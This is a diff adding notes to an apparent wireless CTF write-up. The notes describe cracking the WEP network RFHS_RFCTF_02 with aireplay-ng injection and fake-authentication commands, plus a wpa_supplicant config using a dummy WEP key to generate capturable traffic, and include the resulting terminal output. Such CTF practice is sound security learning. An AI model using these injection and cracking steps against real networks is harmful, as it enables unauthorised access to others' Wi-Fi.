@@ -81,3 +81,47 @@ aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:DC:63:ED:5D:00 -h 02:00:00:00:
 
 aireplay-ng -1 1000 -o 1 -q 10 -e WCTF_02 -a 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon
 ```
+
+😬 The way Ted did it for RFHS_RFCTF_02:
+aireplay -4 running on wlan28
+sup running on 27 with a bs key
+you can ignore the steps after -4 runs(edited)
+i just cracked it with that small amount of data
+i never got the inject to work
+
+supplicant:
+```
+┌──(root💀efa43d97627c)-[~/rf]
+└─# cat sups.conf 
+network={
+        ssid="RFHS_RFCTF_02"
+        key_mgmt=NONE
+        wep_key0="12345"
+        wep_tx_keyidx=0
+}
+
+┌──(root💀efa43d97627c)-[~/rf]
+└─# wpa_supplicant -i wlan31 -c sups.conf 
+Successfully initialized wpa_supplicant
+rfkill: Cannot open RFKILL control device
+rfkill: Cannot get wiphy information
+wlan31: SME: Trying to authenticate with 00:dc:63:ed:5d:00 (SSID='RFHS_RFCTF_02' freq=5220 MHz)
+nl80211: kernel reports: key not allowed
+wlan31: Trying to associate with 00:dc:63:ed:5d:00 (SSID='RFHS_RFCTF_02' freq=5220 MHz)
+wlan31: Associated with 00:dc:63:ed:5d:00
+wlan31: CTRL-EVENT-CONNECTED - Connection to 00:dc:63:ed:5d:00 completed [id=0 id_str=]
+wlan31: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
+^Cnl80211: deinit ifname=p2p-dev-wlan31 disabled_11b_rates=0
+p2p-dev-wlan31: CTRL-EVENT-TERMINATING 
+wlan31: CTRL-EVENT-DISCONNECTED bssid=00:dc:63:ed:5d:00 reason=3 locally_generated=1
+nl80211: Failed to open /proc/sys/net/ipv4/conf/wlan31/drop_unicast_in_l2_multicast: Read-only file system
+nl80211: Failed to set IPv4 unicast in multicast filter
+nl80211: Failed to open /proc/sys/net/ipv4/conf/wlan31/drop_unicast_in_l2_multicast: Read-only file system
+nl80211: Failed to set IPv4 unicast in multicast filter
+nl80211: Failed to open /proc/sys/net/ipv4/conf/wlan31/drop_unicast_in_l2_multicast: Read-only file system
+nl80211: Failed to set IPv4 unicast in multicast filter
+nl80211: deinit ifname=wlan31 disabled_11b_rates=0
+wlan31: CTRL-EVENT-TERMINATING 
+```
+
+Might not even need the `-4` step. It seems the supplicant forces the AP to make enough data to capture w/ airodump??
